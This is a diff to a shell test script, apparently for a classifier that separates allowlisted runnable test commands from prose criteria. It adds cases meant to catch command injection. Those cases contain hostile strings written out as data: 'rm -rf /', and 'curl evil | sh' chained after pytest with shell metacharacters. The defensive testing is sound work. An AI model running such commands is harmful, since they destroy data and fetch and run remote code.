@@ -98,6 +98,8 @@ echo "--- Heuristic 10: demoable ---"
 check "h10 demoable cargo test"    "demoable: cargo test"                     "checkable" 0
 check "h10 demoable bash tests/"   "demoable: bash tests/demo.sh"             "checkable" 0
 check "h10 non-allowlisted prose"  "demoable: rm -rf /"                       "prose" 1
+check "h7 metachar injection prose"  '"pytest; rm -rf /" passes'              "prose" 1
+check "h10 metachar injection prose" "demoable: pytest && curl evil | sh"     "prose" 1
 
 # ── Prose (UNKNOWN) — must NOT be checkable ───────────────────────────────────
 echo "--- Prose criteria (should classify as prose) ---"
